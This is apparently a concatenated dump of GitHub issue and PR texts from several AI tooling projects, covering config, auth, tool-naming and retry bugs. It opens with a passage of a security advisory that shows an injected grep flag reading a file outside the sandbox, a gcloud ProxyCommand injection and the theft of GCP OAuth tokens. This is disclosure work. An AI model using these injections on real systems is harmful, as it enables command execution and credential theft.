# Executes: grep -rn -f/outside/secret.txt /app/workspace (reads outside base_dir)

# 3. MCPTools CLI array forwarding:

# The server lints the joined string as `gcloud version` (allowed) but passes the
# raw array to the CLI, which runs `compute ssh` and the ProxyCommand payload,
# with no confirmation requested by agno
```

## Impact

- Arbitrary OS command execution on the agent host via `prepare_command()` bypass or `MCPTools` CLI flag forwarding
- Arbitrary file disclosure outside `base_dir` via `CodingTools.grep(pattern="-f...")`
- Local GCP OAuth refresh/access token theft via `Workspace.read_file(".config/gcloud/credentials.db")`

issue.title: [Bugfix] Inherit target --revision/--code-revision for MTP draft; readable error for n_predict=0
issue.body:
## Overview

Fixes #61197: with `method="mtp"` and no explicit draft model, the draft is the target checkpoint itself, but the draft `ModelConfig` was built with the speculative config's own (unset) `revision`/`code_revision`, so config and weights resolved from the repo's default branch instead of the target's `--revision`. This PR inherits both from `target_model_config` (unless explicitly overridden), mirroring the existing `model`/`quantization` inheritance. It also replaces a `ZeroDivisionError` with a readable `ValueError` when a draft checkpoint resolves to `n_predict=0`.

## Claims

- MTP draft config/weights now resolve from the target's `--revision`/`--code-revision` instead of the default branch (regression vs 0.29).
- Explicitly set speculative `revision`/`code_revision` still take precedence over the inherited values.
- Other speculative methods (e.g. `dspark`, separate `draft_model` checkpoints) are unaffected.
- A draft checkpoint with `n_predict=0` (missing `num_nextn_predict_layers`) now raises a readable `ValueError` instead of `ZeroDivisionError`.

## Validation

Unit tests (mocked, no HF downloads / no GPU), from a fresh `main` checkout (`32b05ad`):

```
PYTHONPATH=$PWD python -m pytest tests/config/test_speculative_draft_hf_overrides.py -q
# 21 passed (17 pre-existing + 4 new regression tests)
PYTHONPATH=$PWD python -m pytest tests/config/test_bailing_mtp_config.py -q
# 2 passed
ruff check vllm/config/speculative.py tests/config/test_speculative_draft_hf_overrides.py
# All checks passed
```

New regression tests (in `tests/config/test_speculative_draft_hf_overrides.py`):
- `test_mtp_draft_inherits_target_revision`
- `test_mtp_draft_explicit_revision_wins`
- `test_explicit_draft_model_does_not_inherit_revision`
- `test_mtp_zero_n_predict_raises_readable_error`

A standalone reproducer confirmed the bug before the fix (draft got `revision=None` despite target `revision="pre-final"`, and `ZeroDivisionError` for `n_predict=0`) and the fixed behavior after.

Note on environment: this sandbox is CPU-only with no HF Hub access, so every test in this file also reports a teardown error from `torch.accelerator.empty_cache()` in `tests/conftest.py` — this happens identically on the unmodified tree (17 passed / 17 teardown errors before my change), and HF-download-dependent tests elsewhere (e.g. `tests/config/test_model_arch_config.py`) fail for the same environmental reasons. Model evaluation is not applicable: this is a config-time-only change that does not affect model outputs, accuracy, or serving behavior.

## Details

**Root cause:** in `SpeculativeConfig.__post_init__`, the `method == "mtp"` branch sets `self.model` from `target_model_config.model_weights or .model` and inherits `quantization`, but leaves `self.revision`/`self.code_revision` as `None`. The draft `ModelConfig(...)` built later passes `revision=self.revision` / `code_revision=self.code_revision`, so the draft resolved config and weights from the default branch rather than the target's pinned revision.

**Design decision:** inheritance is placed next to the existing `model`/`quantization` inheritance and guarded by `is None` checks, so explicit values remain overrides. It intentionally applies only when no explicit draft model is given (i.e. the draft *is* the target checkpoint); a separately provided draft checkpoint is a different repo and keeps its own revision. The `n_predict == 0` guard sits at the top of the existing `elif n_predict is not None:` branch, so `dspark` (separate branch) and valid `n_predict > 0` behavior are unchanged.

**Why this is not a duplicate:** searched open PRs for "61197", "mtp revision inherit", and "ZeroDivisionError n_predict speculative" — no open PR addresses this fix.

**AI assistance:** AI assistance was used during the creation of this PR (with human review of every changed line).

---

- [x] I used vLLM's `/pr-checklist` skill. (Mandatory for agents, optional for humans).
- [x] AI assistance was used during the creation of this PR.

- [x] **Design Fit:** Minimizes impact on core components, reuses existing functionality, and justifies added complexity.
- [x] **Testing and Validation:** Validates the change and ensures any added tests are meaningful and reliable, with CI coverage or documented CI resource constraints and validation performed outside CI.
- [x] **Code Quality and Style:** Keeps code and comments clear and concise, and updates relevant documentation and examples.

issue.title: [Bugfix] Secure /scale_elastic_ep: API-key auth, bool rejection, 400 when elastic EP disabled
issue.body:
## Summary

Fixes #59088.

The `/scale_elastic_ep` endpoint had three bugs:

1. **API-key authentication bypass.** `AuthenticationMiddleware` only guards the `("/v1", "/v2", "/inference", "/cohere")` path prefixes, while the elastic EP router is mounted at the server root — so the middleware never checked this endpoint. `/scale_elastic_ep` is state-changing: while a scale is in progress, `ScalingMiddleware` returns 503 for every request. Anyone with network access could trigger it without a key. This PR adds `/scale_elastic_ep` to `GUARDED_PREFIX`. The read-only `/is_scaling_elastic_ep` stays unguarded, analogous to `/health`.

2. **Boolean parameters accepted as counts.** `isinstance(True, int)` is `True`, so `{"new_data_parallel_size": true}` returned `200 "Scaled to True data parallel engines"`. Both `new_data_parallel_size` and `drain_timeout` now go through a `_require_positive_int` helper that explicitly rejects bools (keeping the same "must be a positive integer" 400 messages as before).

3. **500 for permanently impossible scaling.** On a server started without `--enable-elastic-ep`, the request fails deep in the engine (`AssertionError` from the `data_parallel_backend == "ray"` assert) and surfaces as a bare `500 "Scale failed"` with an empty log message. The handler now checks `parallel_config.enable_elastic_ep` up front and returns `400` with an actionable message ("Restart the server with --enable-elastic-ep to use /scale_elastic_ep"). 400 was chosen over 501 because the endpoint exists and is implemented — the request is invalid for this server's configuration — consistent with the handler's existing `ValueError` → 400 mapping (e.g. exceeding `--elastic-ep-max-dp-size`). The catch-all handler now uses `logger.exception`, so the server log carries the real traceback.

## Duplicate check

No existing PR addresses this: the issue timeline shows no cross-referenced PRs, and a search for open PRs mentioning `59088` in vllm-project/vllm returned none. This is not low-value busywork — it closes an authentication bypass on a state-changing serving endpoint plus two correctness issues in its validation.

## Test results

New tests in `tests/entrypoints/serve/elastic_ep/test_api_router.py` (5 tests):

- `test_rejects_boolean_data_parallel_size` / `test_rejects_boolean_drain_timeout` — boolean inputs are rejected with 400 (both fail on the unfixed code).
- `test_rejects_non_positive_and_non_integer` — 0, negatives, floats, and strings still rejected.
- `test_returns_400_when_elastic_ep_disabled` — disabled elastic EP yields 400 with the actionable message instead of 500 (fails on the unfixed code).
- `test_valid_request_still_scales` — valid integer input with elastic EP enabled still returns 200.

Commands run (repo `.venv`, Python 3.12, CPU-only):

- `python -m pytest tests/entrypoints/serve/elastic_ep/test_api_router.py` → **5 passed**
- `python -m pytest tests/entrypoints/serve/middleware/test_authentication_middleware.py` → **20 passed**. This suite auto-discovers routes per supported task and asserts guarded routes require auth; for the `generate` task it now covers `/scale_elastic_ep` (401 without a token) and confirms `/is_scaling_elastic_ep` stays public.
- `ruff check` and `ruff format --check` on all four touched/added files → clean

A TestClient-level repro (mocked engine client) additionally confirmed the before/after matrix: no-key request went from reaching the handler to `401`; boolean input from `200 "Scaled to True data parallel engines"` to `400`; disabled elastic EP from `500 "Scale failed"` to `400` with the actionable message; `/is_scaling_elastic_ep` remains reachable without a key.

## Model evaluation

No model evaluation needed: this change touches only the HTTP serving layer (auth gating, request validation, error codes). It does not alter model execution, token generation, accuracy, or serving performance.

## AI assistance

AI assistance was used during investigation and implementation. The final diff was reviewed line by line, and the executed test results are listed above.

issue.title: mistralai: the text of an assistant message that also has tool calls is dropped from the conversation history

labels.name: repo-ac7e25de
labels.description: Related to a bug, vulnerability, unexpected error with an existing feature

issue.body:
### Submission checklist

- [x] This is a bug, not a usage question.
- [x] I added a clear and descriptive title that summarizes this issue.
- [x] I used the GitHub search to find a similar question and didn't find it.
- [x] I am sure that this is a bug in LangChain rather than my code.
- [x] The bug is not resolved by updating to the latest stable version of LangChain (or the specific integration package).
- [x] This is not related to the langchain-community package.
- [x] I posted a self-contained, minimal, reproducible example. A maintainer can copy it and run it AS IS.

### How did you discover this issue?

Through source-code inspection or automated scanning, rather than use in a project

### Package (Required)

- [ ] langchain
- [ ] langchain-openai
- [ ] langchain-anthropic
- [ ] langchain-classic
- [ ] langchain-core
- [ ] langchain-model-profiles
- [ ] langchain-tests
- [ ] langchain-text-splitters
- [ ] langchain-chroma
- [ ] langchain-deepseek
- [ ] langchain-exa
- [ ] langchain-fireworks
- [ ] langchain-groq
- [ ] langchain-huggingface
- [x] langchain-mistralai
- [ ] langchain-nomic
- [ ] langchain-ollama
- [ ] langchain-openrouter
- [ ] langchain-perplexity
- [ ] langchain-qdrant
- [ ] langchain-typesafe
- [ ] langchain-xai
- [ ] Other / not sure / general

### Related Issues / PRs

- #41305 (open): `thinking` blocks are dropped from assistant messages with tool calls, by the same line. Its proposed fix keeps only `thinking` blocks, so plain text would still be dropped.
- #21196 / #20565: where the code came from (the API then rejected `content` together with `tool_calls`).

### Reproduction Steps / Example Code (Python)

```python
Reply 1 has text and a tool call. The script prints the assistant message that `ChatMistralAI` sends in the second request.


import json
import sys

import httpx
from langchain.agents import create_agent
from langchain_core.tools import tool
from langchain_mistralai import ChatMistralAI

# Reply 1: the model explains its plan and calls a tool in the same message.
REPLY_1 = {
    "id": "cmpl-1", "object": "chat.completion", "created": 0, "model": "mistral-large-latest",
    "choices": [{
        "index": 0, "finish_reason": "tool_calls",
        "message": {
            "role": "assistant",
            "content": "The port is set in config.json, so I will read that file first.",
            "tool_calls": [{"id": "AbC123xYz", "type": "function",
                            "function": {"name": "read_file", "arguments": "{\"path\": \"config.json\"}"}}],
        },
    }],
    "usage": {"prompt_tokens": 10, "completion_tokens": 10, "total_tokens": 20},
}
# Reply 2: the final answer.
REPLY_2 = {
    "id": "cmpl-2", "object": "chat.completion", "created": 0, "model": "mistral-large-latest",
    "choices": [{"index": 0, "finish_reason": "stop",
                 "message": {"role": "assistant", "content": "The server listens on port 8080."}}],
    "usage": {"prompt_tokens": 10, "completion_tokens": 10, "total_tokens": 20},
}

bodies = []


def reply(request):
    bodies.append(json.loads(request.content))
    return httpx.Response(200, json=REPLY_1 if len(bodies) == 1 else REPLY_2)


@tool
def read_file(path: str) -> str:
    """Read a file."""
    return '{"port": 8080}'


model = ChatMistralAI(model="mistral-large-latest", api_key="test", max_retries=0,
                      client=httpx.Client(base_url="https://api.mistral.ai/v1",
                                          transport=httpx.MockTransport(reply)))
agent = create_agent(model, [read_file])
result = agent.invoke({"messages": [{"role": "user", "content": "Which port does the server use?"}]})

in_memory = result["messages"][1]
sent = next(m for m in bodies[1]["messages"] if m["role"] == "assistant")
print("AIMessage.content in the agent state:", repr(in_memory.content))
print("assistant message sent in request 2: ", json.dumps(sent))
if sent["content"] == "" and in_memory.content:
    print("BUG: the assistant text was dropped from the request history")
    sys.exit(1)
print("OK: the assistant text was kept")
```

### Error Message and Stack Trace (if applicable)

```shell
No exception. Output:


AIMessage.content in the agent state: 'The port is set in config.json, so I will read that file first.'
assistant message sent in request 2:  {"role": "assistant", "tool_calls": [{"function": {"name": "read_file", "arguments": "{\"path\": \"config.json\"}"}, "id": "AbC123xYz"}], "content": ""}
BUG: the assistant text was dropped from the request history
```

### Description

**Expected behavior.** The assistant message is sent back as the model produced it: `content` holds the text and `tool_calls` holds the call.

**Actual behavior.** `content` is sent as `""` whenever the message has tool calls. In an agent, every step that both says something and calls a tool loses its text from all later requests, although the text is still in the LangChain state. The model no longer sees its own earlier plans and explanations. Nothing is logged.

**Root cause** (master 5b0aeb7637, same in 1.1.6): [`chat_models.py#L579-L583`](https://github.com/langchain-ai/langchain/blob/5b0aeb7637/libs/partners/mistralai/langchain_mistralai/chat_models.py#L579-L583)

```python
        if tool_calls and content:
            # Assistant message must have either content or tool_calls, but not both.
            ...
            content = ""
```

This was added for #21196, when the API rejected both fields. The API now accepts them: Mistral's own `mistral-vibe` client and `@ai-sdk/mistral` both send `content` together with `tool_calls`.

**Suggested fix.** Remove the `content = ""` branch (cleaning list content with `_clean_block`). This also fixes #41305.

### System Info

> OS:  Linux
> OS Version:  #147-Ubuntu SMP PREEMPT_DYNAMIC Thu Sep 24 11:33:16 UTC 2026
> Python Version:  3.13.13 | packaged by Anaconda, Inc. | (main, Apr 14 2026, 06:19:41) [GCC 14.3.0]

### Social handles (optional)

_No response_

comment.body: Hi, thanks for the detailed report and reproducer! I'd like to take this one — the `content = ""` branch in `_convert_message_to_mistral_chat_message` drops the assistant text whenever tool calls are present, so the model loses its own earlier plans and explanations in later agent turns. I'll work on a fix that keeps both content and tool calls (which should also cover the thinking-block case in #41305).

issue.title: Raise on user tool name collision with base tools
issue.body:
## Problem

When `add_base_tools=True`, `MultiStepAgent._setup_tools` registers the user's tools first and then merges the base tools over them with `self.tools.update(...)`. A user tool whose `name` collides with a base tool (`web_search`, `visit_webpage`, or `python_interpreter` on `ToolCallingAgent`) is **silently replaced** — no warning, no error. The agent keeps running, but the user's tool is unreachable: the system-prompt schema, the `CodeAgent` executor namespace (`send_tools`) and `execute_tool_call` all route to the built-in tool instead.

Thanks @effson for the clear report on #2885 — a user tool being silently swapped for a built-in one is a nasty footgun.

## Root cause

```python
self.tools = {tool.name: tool for tool in tools}
if add_base_tools:
    self.tools.update(
        {name: cls() for name, cls in TOOL_MAPPING.items() ...}  # overwrites silently
    )
```

`_validate_tools_and_managed_agents` only checks the user-passed tools, managed agent names, and the agent's own name, so the collision with base tools (which share the same `self.tools` routing namespace) is never caught.

## Fix

`_setup_tools` now computes the names of the base tools to be added from `TOOL_MAPPING` keys first — respecting the existing `python_interpreter`/`ToolCallingAgent` filter, so a user tool named `python_interpreter` on `CodeAgent` is still allowed — and checks them for collisions **before instantiating** any base tool, so a missing optional dependency can no longer mask the clear error. The check covers both user tool names and managed agent names (`set(self.tools) | set(self.managed_agents)`), since managed agents share the executor namespace (`{**self.tools, **self.managed_agents}`) with tools and would otherwise shadow a base tool there. On collision it raises a `ValueError` naming the colliding name(s); the error message suggests renaming or passing `add_base_tools=False`.

## Breaking change (release note)

Anyone who currently passes their own `web_search`/`visit_webpage` (or a managed agent with such a name) together with `add_base_tools=True` silently gets the built-in tool today; after this change agent construction raises a `ValueError` instead. This is the intended trade — a loud error beats a silently swapped tool — but it changes upgrade behavior for that pattern. Mitigation: rename the tool/managed agent, or pass `add_base_tools=False`.

## Tests

- `test_user_tool_colliding_with_base_tool_name_raises`: covers `web_search`/`visit_webpage` collisions on `CodeAgent`, the `python_interpreter` collision on `ToolCallingAgent`, the allowed `python_interpreter` case on `CodeAgent` (no such base tool is added there), normal coexistence of a non-colliding user tool with base tools, and the `add_base_tools=False` path.
- `test_managed_agent_colliding_with_base_tool_name_raises` (new): a managed agent named `web_search` with `add_base_tools=True` raises; a non-colliding managed agent works fine alongside base tools.
- `test_collision_check_runs_before_base_tool_instantiation` (new): with a `TOOL_MAPPING` entry whose constructor raises `ImportError` (simulating a missing optional dependency), the collision still raises the clear `ValueError` first.
- Collision tests: 3 passed. Full `tests/test_agents.py`: no new failures vs the pristine checkout (the 11 failures + 2 errors are pre-existing environment issues — missing optional deps/models).

Fixes #2885

issue.title: [Fix] deepseek_v4: route unquantized BF16/F16/F32 checkpoints off the MXFP4 expert path

labels.name: repo-6e5a3e3c
labels.description: CI: run the baseline test suite on this PR

issue.body:
## Motivation

Fixes https://github.com/sgl-project/sglang/issues/44810.

A DeepSeek-V4 BF16 checkpoint carries no `quantization_config`. In `ModelConfig`, `is_fp4_experts` is initialized from the `SGLANG_DSV4_FP4_EXPERTS` env var (default `True`) and is only overridden when `try_detect_fp4_experts()` returns a non-`None` value. That detector returned `None` for any dtype other than the mxfp4-packed (`U8`/`I8`/`F4`) or FP8-converted (`F8_E4M3`) layouts — including unquantized `BF16`/`F16`/`F32`. As a result, an unquantized DSV4 checkpoint kept `is_fp4_experts=True` under default settings and the auto MoE-runner backend routed it to the `flashinfer_mxfp4` path, while the rest of the stack treated it as unquantized, crashing the first request with `ValueError: too many values to unpack (expected 3)`.

## Modifications

- `python/sglang/srt/configs/deepseek_v4.py`: `try_detect_fp4_experts()` now returns `False` for unquantized routed-expert dtypes (`BF16`/`F16`/`F32`), so unquantized checkpoints take the unquantized expert path instead of falling back to the FP4-experts env default. Genuine MXFP4 (`U8`/`I8`/`F4` → `True`) and FP8-converted (`F8_E4M3` → `False`) detection is unchanged; unknown or unreadable headers still return `None` and fall back to the user/env default.
- `test/registered/unit/configs/test_deepseek_v4_fp4_detect.py`: new unit tests covering `BF16`/`F16`/`F32` → `False`, `U8`/`I8`/`F4` → `True`, `F8_E4M3` → `False`, and `None` for unreadable/empty checkpoint dirs.

## Reproducer (no GPU required)

A full GPU repro is infeasible here (needs 8x B300 plus a DSV4 BF16 checkpoint), so the bug is demonstrated at the config-routing layer where it lives. Save the script below as `repro_44810.py` in the repo root and run `python3 repro_44810.py`. It builds fake checkpoint dirs (a single safetensors shard whose header declares one routed-expert weight tensor of the given dtype) and drives the real `try_detect_fp4_experts()` plus the real `probe_routed_expert_weight_dtype()` (AST-extracted from the repo; the only stubs are `transformers`/`QuantizationConfig` class-level deps and `find_local_repo_dir`, which is unreachable for local dirs), then applies the same `None`-vs-env-default logic `ModelConfig` uses.

```python
import ast, json, os, re, struct, sys, tempfile, types
from pathlib import Path
from typing import Optional

REPO = os.path.dirname(os.path.abspath(__file__))

weight_utils_src = open(f"{REPO}/python/sglang/srt/model_loader/weight_utils.py").read()
tree = ast.parse(weight_utils_src)

def _wanted(n):
    if isinstance(n, ast.Assign):
        return any(getattr(t, "id", "") == "_ROUTED_EXPERT_KEY_RE" for t in n.targets)
    return getattr(n, "name", None) == "probe_routed_expert_weight_dtype"

seg = [n for n in tree.body if _wanted(n)]
wmod = types.ModuleType("sglang.srt.model_loader.weight_utils")
wmod.__dict__.update({"re": re, "json": json, "struct": struct, "os": os,
                      "Path": Path, "Optional": Optional,
                      "logging": __import__("logging")})
exec(compile(ast.Module(body=seg, type_ignores=[]), "<wu>", "exec"), wmod.__dict__)

def make_pkg(name):
    m = types.ModuleType(name); m.__path__ = []; sys.modules[name] = m; return m

for pkg in ["sglang", "sglang.srt", "sglang.srt.configs",
            "sglang.srt.model_loader", "sglang.srt.utils"]:
    make_pkg(pkg)
sys.modules["sglang.srt.model_loader.weight_utils"] = wmod
sys.modules["sglang.srt.utils"].find_local_repo_dir = lambda *a, **k: None

dv4_tree = ast.parse(open(f"{REPO}/python/sglang/srt/configs/deepseek_v4.py").read())
fn_node = next(n for n in dv4_tree.body
               if getattr(n, "name", None) == "try_detect_fp4_experts")
dv4 = types.SimpleNamespace()
dv4.__dict__.update({"os": os, "logging": __import__("logging"), "Optional": Optional})
exec(compile(ast.Module(body=[fn_node], type_ignores=[]), "<dv4>", "exec"), dv4.__dict__)

KEY = "model.layers.0.mlp.experts.0.w1.weight"

def make_ckpt(dtype_str):
    d = tempfile.mkdtemp()
    header = json.dumps({KEY: {"dtype": dtype_str, "shape": [2048, 4096]}}).encode()
    with open(os.path.join(d, "model.safetensors"), "wb") as f:
        f.write(struct.pack("<Q", len(header))); f.write(header)
    return d

for dtype in ["BF16", "F16", "F32", "U8", "I8", "F4", "F8_E4M3"]:
    detected = dv4.try_detect_fp4_experts(make_ckpt(dtype))
    is_fp4_experts = detected if detected is not None else True  # env default
    print(f"safetensors dtype={dtype:8s} -> try_detect_fp4_experts()={detected!s:5s}"
          f"  is_fp4_experts={is_fp4_experts}")
```

**Before** (also logs `Unexpected routed-expert safetensors dtype=BF16 for DeepSeek V4` to stderr):

```
safetensors dtype=BF16     -> try_detect_fp4_experts()=None   is_fp4_experts=True
safetensors dtype=F16      -> try_detect_fp4_experts()=None   is_fp4_experts=True
safetensors dtype=F32      -> try_detect_fp4_experts()=None   is_fp4_experts=True
safetensors dtype=U8       -> try_detect_fp4_experts()=True   is_fp4_experts=True
safetensors dtype=I8       -> try_detect_fp4_experts()=True   is_fp4_experts=True
safetensors dtype=F4       -> try_detect_fp4_experts()=True   is_fp4_experts=True
safetensors dtype=F8_E4M3  -> try_detect_fp4_experts()=False  is_fp4_experts=False
```

**After**:

```
safetensors dtype=BF16     -> try_detect_fp4_experts()=False  is_fp4_experts=False
safetensors dtype=F16      -> try_detect_fp4_experts()=False  is_fp4_experts=False
safetensors dtype=F32      -> try_detect_fp4_experts()=False  is_fp4_experts=False
safetensors dtype=U8       -> try_detect_fp4_experts()=True   is_fp4_experts=True
safetensors dtype=I8       -> try_detect_fp4_experts()=True   is_fp4_experts=True
safetensors dtype=F4       -> try_detect_fp4_experts()=True   is_fp4_experts=True
safetensors dtype=F8_E4M3  -> try_detect_fp4_experts()=False  is_fp4_experts=False
```

## Accuracy Tests

This change only affects config-time routing for DeepSeek-V4 checkpoints without an explicit `quantization_config`; no kernel or forward-path code is touched. The new unit tests assert the detection matrix above (the full sglang import chain is GPU/heavy-dep bound in this environment, so the test logic was additionally validated by executing the real extracted functions against fake checkpoint shards — all 9 cases pass). Please let CI run the new `test/registered/unit/configs/test_deepseek_v4_fp4_detect.py`.

## Speed Tests and Profiling

Not applicable — config-time detection only; no inference-path changes.

## Checklist

- [x] Format your code according to the [Format code with pre-commit](https://docs.sglang.io/developer_guide/contribution_guide.html#format-code-with-pre-commit).
- [x] Add unit tests according to the [Run and add unit tests](https://docs.sglang.io/developer_guide/contribution_guide.html#run-and-add-unit-tests).
- [ ] Update documentation according to [Write documentations](https://docs.sglang.io/developer_guide/contribution_guide.html#write-documentations). (Not needed: no user-facing API change.)
- [ ] Provide accuracy and speed benchmark results according to [Test the accuracy](https://docs.sglang.io/developer_guide/contribution_guide.html#test-the-accuracy) and [Benchmark the speed](https://docs.sglang.io/developer_guide/contribution_guide.html#benchmark-the-speed). (Not applicable — config routing only; see note above.)
- [x] Follow the SGLang code style [guidance](https://docs.sglang.io/developer_guide/contribution_guide.html#code-style-guidance).

- [x] This is not related to the langchain-community package.
- [x] I posted a self-contained, minimal, reproducible example. A maintainer can copy it and run it AS IS.

### Related Issues / PRs

- #9478: a retried subgraph node is resumed into its failed attempt and discards the new answer. Different case: there the node fails once and then succeeds, with a subgraph; here there is no subgraph, and a node that keeps failing is retried without end. A fix for #9478 does not change this one.


### Reproduction Steps / Example Code (Python)

```python
from importlib.metadata import version
from typing import TypedDict

from langgraph.checkpoint.memory import InMemorySaver
from langgraph.graph import END, START, StateGraph
from langgraph.types import Command, RetryPolicy, interrupt

attempts = []


class State(TypedDict, total=False):
    amount: int


def work(state: State) -> State:
    amount = interrupt("How much?")
    attempts.append(amount)
    raise RuntimeError("service unavailable")  # The service stays down.


graph = StateGraph(State)
graph.add_node("work", work, retry_policy=RetryPolicy(max_attempts=2, initial_interval=0, retry_on=RuntimeError))
graph.add_edge(START, "work")
graph.add_edge("work", END)
app = graph.compile(checkpointer=InMemorySaver())
config = {"configurable": {"thread_id": "1"}}

result, answer = app.invoke({}, config), 0
try:
    while "__interrupt__" in result and answer < 8:  # Stop answering after eight questions.
        answer += 1
        result = app.invoke(Command(resume=answer), config)
    outcome = f"returned {result}"
except RuntimeError as error:
    outcome = f"raised {error!r}"
print(f"langgraph {version('langgraph')}: {len(attempts)} attempts failed (answers {attempts}), then {outcome}")
```

### Error Message and Stack Trace (if applicable)

```shell
langgraph 1.2.18: 8 attempts failed (answers [1, 2, 3, 4, 5, 6, 7, 8]), then returned {'__interrupt__': [Interrupt(value='How much?', id='4978fa4cfcf8911cc6c2edc71d1b0917', response_schema=None)]}
```

### Description

- I'm running a node with `RetryPolicy(max_attempts=2)` that asks for an amount with `interrupt` and then calls a service that is down, so every attempt fails.
- I expect the node to give up after two failed attempts: the second resume should raise `RuntimeError("service unavailable")`, as it does for a node that fails twice without asking.
- Instead, the node is never given up on. Each failed attempt is retried, the retry asks again, and the run pauses; when it resumes, the node runs from its start and counts its attempts from zero again, so it never reaches `max_attempts`. The user is asked again and again (the script stops answering after eight questions), and the error never reaches the caller.
- The same happens in the Functional API, with a `@task(retry_policy=RetryPolicy(max_attempts=2, ...))` that calls `interrupt()` and then raises, awaited by an `@entrypoint` with a checkpointer: eight attempts, still asking.
- It also happens on `main` (6f2df053f4).


### System Info

System Information
------------------
> OS:  Linux
> OS Version:  6.8.0-124-generic
> Python Version:  3.12.13

Package Information
-------------------
> langgraph: 1.2.18
> langgraph-checkpoint: 4.3.1
> langchain_core: 1.7.0

I'd like to take this one. I'll look into why the attempt count resets on resume after an interrupt and put up a fix.

issue.title: [Fix] nixl: release transfer worker when room is aborted mid-wait
issue.body:
## Motivation

Fixes #44369.

In PD disaggregation with the NIXL backend, aborting a request after its KV
transfer handles were submitted did not bound the prefill transfer worker's
wait when a handle stayed healthy but non-terminal (`PROC`):
`NixlKVManager._await_handles()` only arms its settle deadline after an `ERR`
is observed, so with every handle `PROC` the deadline stays `None` and the
wait is unbounded. The abort notification marks the room `Failed` and
registers the deferred ACK target, but it neither wakes a worker already
inside `_await_handles()` nor drains the room's `_staging_outstanding`
count — so the deferred abort ACK never fires and the worker thread never
returns to its queue. With the default `SGLANG_DISAGGREGATION_QUEUE_SIZE=4`,
four such aborted rooms can exhaust all prefill transfer workers.

## Modifications

- `python/sglang/srt/disaggregation/nixl/conn.py`
  - `_await_handles()` now accepts an optional `room` and returns
    `(settled, any_failed, aborted)`. When the room is marked `Failed` while
    polling (e.g. a decode-side abort notification landed after the batch
    was submitted), the wait ends immediately with `aborted=True` instead of
    spinning forever on healthy non-terminal handles. The exception-path
    call site passes no room, so its already-bounded (`failure_seen=True`)
    behavior is unchanged.
  - `transfer_worker()` handles the aborted wait: it releases the chunk's
    staging count (guarded by the existing `staging_counted` flag, mirroring
    the failure path) and fires the deferred abort ACK via
    `_maybe_ack_drained_abort()`, then continues with the next chunk. The
    room stays `Failed`, exactly as the abort notification left it.
- `test/registered/unit/disaggregation/test_nixl_deferred_kv_release.py`
  - Two new regression tests (see below); one existing mock updated for the
    new 3-tuple return.

Design note: the ACK fires once the worker's accounting drains, matching the
deferred-ACK protocol's intent ("send the deferred ack once an aborted
room's chunks have drained"). The decode side keeps its release timeout as a
backstop, as before.

## Reproducer

Deterministic and GPU-free: a fake NIXL agent whose handle stays `PROC`,
driving the real `_handle_abort_notification()` and (Phase B) the real
`transfer_worker()`. Save as `repro_44369.py` and run with
`PYTHONPATH=python python repro_44369.py` from a checkout.

<details>
<summary>repro_44369.py</summary>

```python
"""Reproducer for sgl-project/sglang issue #44369 (GPU-free, no RDMA)."""
import inspect
from collections import defaultdict
from threading import Event, Thread
from time import sleep, time
from types import SimpleNamespace

import numpy as np

from sglang.srt.disaggregation.base.conn import KVPoll
from sglang.srt.disaggregation.common.conn import AbortNotification
from sglang.srt.disaggregation.common.utils import TransferKVChunk
from sglang.srt.disaggregation.nixl.conn import NixlKVManager

ROOM = 90210
HANDLE = object()


class FakeAgent:
    def __init__(self):
        self.state = "PROC"
        self.reads = 0

    def check_xfer_state(self, handle):
        self.reads += 1
        return self.state


def make_manager(agent):
    manager = NixlKVManager.__new__(NixlKVManager)
    manager.agent = agent
    manager.request_status = {ROOM: KVPoll.WaitingForInput}
    manager.req_to_decode_prefix_len = {}
    manager.transfer_infos = {}
    manager.exceptions = {}
    manager._staging_outstanding = defaultdict(int)
    manager._deferred_ack_targets = {}
    manager._deferred_ack_poisoned_rooms = set()
    manager.enable_deferred_decode_kv_release = True
    manager.enable_staging = False
    manager._staging_ctx = None
    manager.sent_acks = []
    manager.update_status = lambda room, status: manager.request_status.__setitem__(
        room, status
    )
    manager.record_failure = lambda room, reason: None
    manager._send_abort_ack = lambda room, target: manager.sent_acks.append(
        (room, target)
    )
    manager._reload_invalidated_peers = lambda infos: None
    return manager


def abort_message():
    return AbortNotification(
        room=ROOM, decode_ip="127.0.0.1", decode_port=54321, generation=7
    ).to_zmq()


def await_kwargs(manager):
    if "room" in inspect.signature(manager._await_handles).parameters:
        return {"room": ROOM}
    return {}


def wait_until_polling(agent):
    deadline = time() + 10
    while agent.reads == 0 and time() < deadline:
        sleep(0.001)
    assert agent.reads > 0


def phase_a():
    print("=== Phase A: direct _await_handles vs abort ===")
    agent = FakeAgent()
    manager = make_manager(agent)
    manager._staging_outstanding[ROOM] = 1
    entered, returned = Event(), Event()
    result = {}

    def wait_for_handle():
        entered.set()
        result["value"] = manager._await_handles(
            [HANDLE], failure_seen=False, **await_kwargs(manager)
        )
        returned.set()

    thread = Thread(target=wait_for_handle, daemon=True)
    thread.start()
    assert entered.wait(5)
    wait_until_polling(agent)
    reads_before_abort = agent.reads
    assert manager._handle_abort_notification(abort_message())
    assert manager.request_status[ROOM] == KVPoll.Failed
    woke = returned.wait(2.0)
    sleep(0.1)
    print(
        {
            "waiter_returned_within_2s_after_abort": woke,
            "waiter_alive_after_abort": thread.is_alive(),
            "return_value": result.get("value"),
            "reads_before_abort": reads_before_abort,
            "reads_after_abort": agent.reads,
        }
    )
    agent.state = "DONE"
    returned.wait(3)
    thread.join(2)


def phase_b():
    print("=== Phase B: transfer_worker vs abort (accounting + ACK) ===")
    agent = FakeAgent()
    manager = make_manager(agent)
    manager.is_mla_backend = False
    manager.is_hybrid_mla_backend = False
    manager.attn_tp_size = 1
    manager.transfer_source_rank = 0
    manager.kv_args = SimpleNamespace(kv_data_ptrs=[0x1000])
    manager.decode_kv_args_table = {
        "agent0": SimpleNamespace(
            decode_tp_size=1,
            requires_dcp_relayout=False,
            kv_xfer_segments=None,
            dst_homogeneous_mem_kind="VRAM",
            dst_kv_ptrs=[0x2000],
            gpu_id=0,
        )
    }
    manager.transfer_infos = {
        ROOM: {
            "req0": SimpleNamespace(
                room=ROOM,
                is_dummy=False,
                agent_name="agent0",
                dst_kv_indices=np.array([0], dtype=np.int64),
                dst_aux_index=np.array([0], dtype=np.int64),
                decode_prefix_len=0,
            )
        }
    }
    manager.send_kvcache = lambda *a, **k: HANDLE
    chunk = TransferKVChunk(
        room=ROOM,
        prefill_kv_indices=np.array([1], dtype=np.int32),
        index_slice=slice(0, 1),
        is_last_chunk=False,
        chunk_id=0,
        prefill_aux_index=None,
        state_indices=None,
    )
    state = {"n": 0}

    def fake_get():
